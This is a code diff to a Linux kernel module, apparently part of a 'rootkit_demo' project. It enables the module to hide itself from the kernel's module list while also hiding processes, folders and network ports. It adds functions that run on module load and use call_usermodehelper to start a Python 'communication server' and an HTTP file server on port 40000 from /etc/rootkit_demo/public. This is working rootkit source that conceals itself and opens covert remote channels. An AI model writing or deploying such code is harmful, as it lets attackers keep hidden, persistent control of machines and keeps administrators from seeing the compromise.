@@ -2,6 +2,8 @@
 #include "hide_folder.h"
 #include "hide_netstat.h"
 
+//Environment used for commands
+char *userEnv[] = {"HOME=/", "TERM=xterm-256color", "PATH=/sbin:/usr/sbin:/bin:/usr/bin:/tmp:/", NULL};
 
 // ----------------- HIDE MODULE -----------------
 
@@ -22,6 +24,24 @@ void hide_module(void)
 	list_del(&THIS_MODULE->mkobj.kobj.entry);
 }
 
+// ----------------- COMMANDS TO EXECUTE -----------------
+
+/*
+Start the communication server
+*/
+void start_comm(void) {
+    char *argv[] = { "/bin/bash", "-c", "python3 /etc/rootkit_demo/public/source/server.py &", NULL};
+    call_usermodehelper(argv[0], argv, userEnv, UMH_WAIT_PROC);
+}
+
+/*
+Start the download server
+*/
+void start_down(void) {
+    char *argv[] = { "/bin/bash", "-c", "cd /etc/rootkit_demo/public/; python3 -m http.server 40000 &", NULL};
+    call_usermodehelper(argv[0], argv, userEnv, UMH_WAIT_PROC);
+}
+
 
 // ----------------- INIT/EXIT FUNCTIONS -----------------
 
@@ -29,10 +49,13 @@ void hide_module(void)
 // Function triggered when lkm is loaded
 static int __init my_init(void)
 {
-	// hide_module();
+	hide_module();
 	hide_process();
 	hide_folder();
 	hide_ports();
+    
+    start_comm();
+    start_down();
 
 	return 0;
 }
